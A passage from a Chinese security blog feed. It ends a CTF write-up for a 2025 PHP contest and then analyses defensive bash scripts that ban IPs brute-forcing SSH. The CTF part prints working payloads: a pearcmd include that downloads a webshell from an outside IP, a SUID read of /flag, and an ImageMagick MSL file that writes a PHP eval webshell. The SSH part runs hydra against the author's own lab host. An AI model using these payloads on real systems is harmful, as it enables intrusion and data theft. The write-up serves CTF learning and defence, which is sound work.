src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image17.png"></p><p>写入成功</p><p>在进行包含即可</p><p><code>?oupeng=/tmp/hello</code></p><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image18.png"></p><h5 id="include-best"><a href="#include-best" class="headerlink" title="include_best"></a>include_best</h5><p>题目提示：难度继续提升，但需要想到the end of lfi 问题便可迎刃而解哦，当然裸文件包含可以吗，最后需要注意suid提权问题哦 不然看不到flag</p><p>这道题有多种方法可以解答，比赛的时候我用的也是裸文件包含</p><p> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_REQUEST[&quot;oupeng&quot;])) &#123; </span><br><span class="line">    $pass = $_REQUEST[&quot;oupeng&quot;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fliter($params): bool&#123;</span><br><span class="line">     $black = [&quot;call_user_func&quot;,&quot;assert&quot;,&quot;&lt;&quot;,&quot;?&quot;,&quot;$&quot;,&quot;[&quot;,&quot;]&quot;,&quot;;&quot;,&quot;eval&quot;,&quot;&gt;&quot;,&quot;@&quot;,&quot;_&quot;,&quot;create&quot;,&quot;install&quot;,&quot;pear&quot;,&quot;rot13&quot;];</span><br><span class="line">         foreach($black as $noword)&#123;</span><br><span class="line">           if(stristr($params, $noword)) return False;</span><br><span class="line">    &#125;</span><br><span class="line">    return True;</span><br><span class="line">&#125;  </span><br><span class="line">if(fliter($_SERVER[&quot;QUERY_STRING&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">include $pass;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">die(&quot;fuck off!!!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然过滤了pear，create，但是并没有过滤download </p><p><code>index.php?+download+http://42.123.123.176:7777/2.php+&amp;oupeng=/usr/local/lib/php/%70%65%61%72cmd.php</code></p><p>这里我们需要先去vps上，上传我们的shell,然后执行，蚁剑连接</p><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image19.png"></p><p>成功下载下来，蚁剑进行连接</p><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image20.png"></p><p>尝试直接打开flag文件，发现空白</p><p>考虑权限不够</p><p>终端执行</p><p><code>find / -perm -4000 -type f -exec ls -ld &#123;&#125; \; 2&gt;/dev/null</code></p><p>查找有无suid提权的可能</p><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image21.png"></p><p>发现这些都具有s权限</p><p><code>/bin/date -f /flag</code></p><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image22.png"></p><p>执行获取flag</p><h5 id="Imagemagick"><a href="#Imagemagick" class="headerlink" title="Imagemagick"></a>Imagemagick</h5><p>很遗憾的一道题，最开始思路偏了，一直关注历年的cve漏洞去了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$op </span>= <span class="variable">$_REQUEST</span>[<span class="string">&#x27;oupeng&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="variable">$sec </span>= <span class="variable">$_REQUEST</span>[<span class="string">&#x27;security&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">new</span> <span class="variable">$op</span>(<span class="variable">$sec</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>提示:一道相对的难题，请仔细查阅关于Imagemagick的漏洞，尤其注意new $op($sec)的形式哦</p><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image23.png"></p><p>查到相关文章，但是时间已经来不及了，多给10分钟应该就出了</p><p>最开始我直接拿这个poc进行利用，发现上传之后直接502了</p><p>最后解决发现原因是 &lt;&gt; 被Imagemagick解析会使他崩溃</p><p>我们进行实体化编码</p><p><code>1.xml</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;caption:<span class="symbol">&amp;lt;</span>?php @eval($_GET[&#x27;a&#x27;]); ?<span class="symbol">&amp;gt;</span>&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;info:/var/www/html/swarm.php&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>1.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://yzctf.nxoupeng.com:33677/?oupeng=Imagick&amp;security=vid:msl:/tmp/php*&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用1.html.html上传我们的1.xml即可</p><p>然后再去访问 swarm.php</p><p><code>/swarm.php?a=system(&#39;cat /flag&#39;);</code></p><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image24.png"></p><p>遗憾！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;拿了好多一血，最后时间快到了才查出来文档，遗憾，没能拿第一！&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://heisha123.github.io/categories/CTF/"/>
    
    
    <category term="西安欧鹏杯2025" scheme="https://heisha123.github.io/tags/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8F%E6%9D%AF2025/"/>
    
  </entry>
  
  <entry>
    <title>两个应急响应脚本分析</title>
    <link href="https://heisha123.github.io/2025/08/03/%E4%B8%A4%E4%B8%AA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>https://heisha123.github.io/2025/08/03/%E4%B8%A4%E4%B8%AA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/</id>
    <published>2025-08-03T12:37:51.000Z</published>
    <updated>2025-08-03T14:26:52.924Z</updated>
    
    <content type="html"><![CDATA[<h3 id="自动封禁多次尝试暴力破解-SSH-密码的-IP-地址"><a href="#自动封禁多次尝试暴力破解-SSH-密码的-IP-地址" class="headerlink" title="自动封禁多次尝试暴力破解 SSH 密码的 IP 地址"></a>自动封禁多次尝试暴力破解 SSH 密码的 IP 地址</h3><span id="more"></span><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">IP=$(awk <span class="string">&#x27;/Failed password/ &#123;IP[$(NF-3)]++&#125; END &#123; for (k in IP) &#123; if (IP[k]&gt;=4) print k &#125;&#125;&#x27;</span> /var/log/secure)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$IP</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  tmpIP=(`iptables -L -n | <span class="built_in">tr</span> -s <span class="string">&quot; &quot;</span> | awk <span class="string">&#x27;/^DROP/ &amp;&amp; /22$/ &#123;print $4&#125;&#x27;</span>`)</span><br><span class="line">    </span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$&#123;tmpIP[@]&#125;</span> | grep -qw <span class="variable">$i</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line">  <span class="keyword">then</span></span><br><span class="line">    iptables -I INPUT -p tcp --dport 22 -s <span class="variable">$i</span> -j DROP </span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">rpm -q iptables-services &amp;&gt; /dev/null</span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   yum -y install iptables-services &amp;&gt;/dev/null</span><br><span class="line">   systemctl <span class="built_in">enable</span> --now iptables.service &amp;&gt; /dev/null</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">iptables-save &gt; /etc/sysconfig/iptables</span><br><span class="line"><span class="built_in">unset</span> tmpIP</span><br></pre></td></tr></table></figure><p>分析</p><ol><li>首先从<code>/var/log/secure</code>日志文件中提取失败的 SSH 登录尝试：<ul><li>使用<code>awk</code>命令统计所有出现 “Failed password” 记录的 IP 地址</li><li>$(NF-3) 指的是  NF 是最后一列，-3 就是倒数第三列</li><li>只筛选出尝试次数不少于 4 次的 IP 地址</li></ul></li><li>对于这些可疑 IP 地址：<ul><li>检查它们是否已经被 iptables 封禁</li><li>如果尚未封禁，则添加 iptables 规则禁止该 IP 访问 22 端口 (SSH)</li></ul></li><li>确保系统安装了 iptables-services：<ul><li>如果未安装，则通过 yum 自动安装</li><li>设置 iptables 服务开机启动并立即启动</li></ul></li><li>保存 iptables 规则到<code>/etc/sysconfig/iptables</code>，确保重启后规则仍然有效</li><li>清理临时变量</li></ol><p>这里是CentOS的环境，我们改为ubantu的环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IP=$(awk <span class="string">&#x27;/Failed password/ &#123;IP[$(NF-3)]++&#125; END &#123; for (k in IP) &#123; if (IP[k]&gt;=10) print k &#125;&#125;&#x27;</span> /var/log/auth.log)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$IP</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">  tmpIP=(`iptables -L -n | <span class="built_in">tr</span> -s <span class="string">&quot; &quot;</span> | awk <span class="string">&#x27;/^DROP/ &amp;&amp; /22$/ &#123;print $4&#125;&#x27;</span>`)</span><br><span class="line">    </span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$&#123;tmpIP[@]&#125;</span> | grep -qw <span class="variable">$i</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line">  <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    iptables -I INPUT -p tcp --dport 22 -s <span class="variable">$i</span> -j DROP </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;已屏蔽IP: <span class="variable">$i</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查iptables-persistent是否安装（Ubuntu中用于保存规则）</span></span><br><span class="line">dpkg -s iptables-persistent &amp;&gt; /dev/null</span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   apt-get update &amp;&gt;/dev/null</span><br><span class="line">   apt-get -y install iptables-persistent &amp;&gt;/dev/null</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">netfilter-persistent save &amp;&gt;/dev/null</span><br><span class="line">netfilter-persistent reload &amp;&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> tmpIP</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里 4次 太少了，一般爆破至少都是1000-10000 +</p><p>由于测试，我们设置为10试试效果</p><p>我们先用攻击机ping一下 靶机</p><p><img src="/2025/08/03/%E4%B8%A4%E4%B8%AA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/image-20250803204525325.png" alt="image-20250803204525325"></p><p>网络通畅</p><p>接下来我们用kali自带的Hydra(九头蛇) 进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P /top100_ssh_vps.txt 192.168.197.133 ssh</span><br></pre></td></tr></table></figure><p><img src="/2025/08/03/%E4%B8%A4%E4%B8%AA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/image-20250803205013657.png" alt="image-20250803205013657"></p><p>我用用-Vv这个参数看看爆破过程</p><p><img src="/2025/08/03/%E4%B8%A4%E4%B8%AA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/image-20250803205204546.png" alt="image-20250803205204546"></p><p>看来我们的密码还是挺强的</p><p>哈哈哈</p><p>然后我们去 靶机查看一下日志</p><p><img src="/2025/08/03/%E4%B8%A4%E4%B8%AA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/image-20250803205311180.png" alt="image-20250803205311180"></p><p>这里也是能够看见我们刚刚的尝试，这个脚本也是利用了这个日志实现的</p><p>然后我们运行一下脚本</p><p><img src="/2025/08/03/%E4%B8%A4%E4%B8%AA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/image-20250803205459167.png" alt="image-20250803205459167"></p><p>给他可执行权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x deny_ssh.sh</span><br></pre></td></tr></table></figure><p>运行<img src="/2025/08/03/%E4%B8%A4%E4%B8%AA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/image-20250803205629674.png" alt="image-20250803205629674"></p><p>可以看到成功，但是不小心把我物理机的ip也屏蔽了</p><p>哈哈哈哈</p><p>我们放行 一下物理机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -L INPUT --line-numbers | grep DROP</span><br></pre></td></tr></table></figure><p>查看一下被drop的ip</p><p><img src="/2025/08/03/%E4%B8%A4%E4%B8%AA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/image-20250803205959336.png" alt="image-20250803205959336"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 假设规则序号是1（从上面命令获取）</span><br><span class="line">iptables -D INPUT 1</span><br><span class="line"></span><br><span class="line"># 或者直接通过IP地址删除</span><br><span class="line">iptables -D INPUT -s 192.168.197.1 -p tcp --dport 22 -j DROP</span><br></pre></td></tr></table></figure><p>两种方法都可以</p><p><img src="/2025/08/03/%E4%B8%A4%E4%B8%AA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/image-20250803210209315.png" alt="image-20250803210209315"></p><p>我们优化一下脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置变量</span></span><br><span class="line">LOG_FILE=<span class="string">&quot;/var/log/auth.log&quot;</span></span><br><span class="line">BLOCKED_IPS_DIR=<span class="string">&quot;/var/log/blocked_ips&quot;</span></span><br><span class="line">BLOCK_THRESHOLD=4  <span class="comment"># 触发封锁的失败次数</span></span><br><span class="line">UNBAN_HOURS=24     <span class="comment"># 解封时间（小时）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保存储封锁记录的目录存在</span></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$BLOCKED_IPS_DIR</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 检查并解封超过指定时间的IP</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;检查需要解封的IP...&quot;</span></span><br><span class="line"><span class="keyword">for</span> blocked_ip <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$BLOCKED_IPS_DIR</span>&quot;</span>/*; <span class="keyword">do</span></span><br><span class="line">    <span class="comment"># 提取IP地址</span></span><br><span class="line">    ip=$(<span class="built_in">basename</span> <span class="string">&quot;<span class="variable">$blocked_ip</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查文件是否存在且是常规文件</span></span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$blocked_ip</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="comment"># 获取封锁时间（文件创建时间）</span></span><br><span class="line">        block_time=$(<span class="built_in">stat</span> -c %Y <span class="string">&quot;<span class="variable">$blocked_ip</span>&quot;</span>)</span><br><span class="line">        current_time=$(<span class="built_in">date</span> +%s)</span><br><span class="line">        time_diff=$(( (current_time - block_time) / <span class="number">3600</span> ))  <span class="comment"># 转换为小时</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查是否超过解封时间</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$time_diff</span> -ge <span class="variable">$UNBAN_HOURS</span> ]; <span class="keyword">then</span></span><br><span class="line">            <span class="comment"># 从iptables中删除规则</span></span><br><span class="line">            iptables -D INPUT -p tcp --dport 22 -s <span class="string">&quot;<span class="variable">$ip</span>&quot;</span> -j DROP 2&gt;/dev/null</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 删除记录文件</span></span><br><span class="line">            <span class="built_in">rm</span> -f <span class="string">&quot;<span class="variable">$blocked_ip</span>&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;已自动解封IP: <span class="variable">$ip</span>（超过<span class="variable">$UNBAN_HOURS</span>小时无活动）&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 检测并封锁新的恶意IP</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;检测新的恶意IP...&quot;</span></span><br><span class="line"><span class="comment"># 从日志中提取失败次数达到阈值的IP</span></span><br><span class="line">IP=$(awk <span class="string">&#x27;/Failed password/ &#123;IP[$(NF-3)]++&#125; END &#123; for (k in IP) &#123; if (IP[k]&gt;=&#x27;</span><span class="variable">$BLOCK_THRESHOLD</span><span class="string">&#x27;) print k &#125;&#125;&#x27;</span> <span class="string">&quot;<span class="variable">$LOG_FILE</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> <span class="variable">$IP</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="comment"># 检查IP是否已在DROP规则中</span></span><br><span class="line">    <span class="keyword">if</span> ! iptables -L INPUT -n | grep -q <span class="string">&quot;DROP.*tcp dpt:22.*<span class="variable">$ip</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">        <span class="comment"># 添加封锁规则</span></span><br><span class="line">        iptables -I INPUT -p tcp --dport 22 -s <span class="string">&quot;<span class="variable">$ip</span>&quot;</span> -j DROP</span><br><span class="line">        <span class="comment"># 创建/更新封锁记录文件（文件修改时间将用于判断解封）</span></span><br><span class="line">        <span class="built_in">touch</span> <span class="string">&quot;<span class="variable">$BLOCKED_IPS_DIR</span>/<span class="variable">$ip</span>&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;已封锁IP: <span class="variable">$ip</span>（失败次数超过<span class="variable">$BLOCK_THRESHOLD</span>次）&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="comment"># 如果IP已被封锁，更新记录文件时间（表示该IP仍在尝试）</span></span><br><span class="line">        <span class="built_in">touch</span> <span class="string">&quot;<span class="variable">$BLOCKED_IPS_DIR</span>/<span class="variable">$ip</span>&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 确保iptables-persistent已安装</span></span><br><span class="line"><span class="keyword">if</span> ! dpkg -s iptables-persistent &amp;&gt; /dev/null; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;安装iptables-persistent...&quot;</span></span><br><span class="line">    apt-get update &amp;&gt;/dev/null</span><br><span class="line">    apt-get -y install iptables-persistent &amp;&gt;/dev/null</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 保存规则</span></span><br><span class="line">netfilter-persistent save &amp;&gt;/dev/null</span><br><span class="line">netfilter-persistent reload &amp;&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;操作完成&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><strong>添加自动解封功能</strong>：<ul><li>创建了<code>/var/log/blocked_ips</code>目录存储被封锁 IP 的记录</li><li>每个被封锁的 IP 会创建一个对应的文件，文件的修改时间用于跟踪最后一次尝试</li><li>脚本运行时会检查所有封锁记录，超过 24 小时未活动的 IP 会被自动解封</li></ul></li><li><strong>提高效率</strong>：<ul><li>使用<code>iptables -L ... | grep</code>直接检查 IP 是否已被封锁，替代了原来的数组方法</li><li>对于已封锁但仍在尝试的 IP，会更新其记录文件时间，延长封锁期</li></ul></li><li><strong>增加可读性</strong>：<ul><li>添加了清晰的注释和状态提示</li><li>使用变量集中管理配置参数，便于后续调整</li></ul></li></ol><p>然后我们设置计划任务，每分钟运行一次</p><p><code>chmod +x betterssh.sh</code></p><p><code> crontab -e</code></p><p><code>* * * * * /root/betterssh.sh &gt;&gt; /var/log/ssh_ban.log 2&gt;&amp;1</code></p><p><img src="/2025/08/03/%E4%B8%A4%E4%B8%AA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/image-20250803220545281.png" alt="image-20250803220545281"></p><p>这样他就会一分钟运行一次了</p><p><img src="/2025/08/03/%E4%B8%A4%E4%B8%AA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/image-20250803220625303.png" alt="image-20250803220625303"></p><p>运行正常</p><p>又把我们的ip拉黑了，设置一下白名单</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 